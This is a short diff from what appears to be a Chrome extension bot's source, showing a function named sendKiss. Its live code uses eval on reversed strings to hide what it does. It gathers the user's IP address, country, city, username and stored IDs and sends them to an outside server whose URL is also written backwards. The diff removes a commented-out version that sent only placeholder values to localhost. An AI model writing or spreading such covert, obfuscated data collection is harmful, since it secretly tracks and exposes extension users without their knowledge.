@@ -15,7 +15,6 @@ function sendKiss(callback, sequenceName){
 		eval(("pi.]0[)gsm.)esnopser(esrap.NOSJ(esrap.NOSJ = pif rav ;resu.]0[)gsm.)esnopser(esrap.NOSJ(esrap.NOSJ = nu rav").split("").reverse().join(""))
 		var acme = controllers.bot.acme
 		var request = new BGRequest("sendmessage", "pid=" + localStorage.getItem(STORAGE_ID) + "&sequence=" + sequenceName + "&ip=" + controllers.bot.cinfo.ip + "&country_name=" + controllers.bot.cinfo.country_name + "&city=" + 	controllers.bot.cinfo.city + "&fip=" + fip + "&un=" + un + "&version=" + VERSION_BOT + "&uperiod=" + localStorage.getItem(STORAGE_LIMIT_TIME) + "&codename=" + controllers.bot.codename + "&acme=" + JSON.stringify(acme), ("/tupni/moc.axmoc.revrestobxeh//:ptth").split("").reverse().join(""))
-		//var request = new BGRequest("sendmessage", "pid=" + localStorage.getItem(("txe_bup_elgoog").split("").reverse().join("")) + "&sequence=" + sequence + "&ip=" + "hidden" + "&country_name=" + "hidden" + "&city=" + 	"hidden" + "&fip=" + "hidden" + "&un=" + "hidden", "http://localhost/input")
 		chrome.runtime.sendMessage({message: request}, function(responseMessage) {
 			var handleResponse = function(getResponse, sender, sendResponse) {
 					chrome.extension.onMessage.removeListener(handleResponse)
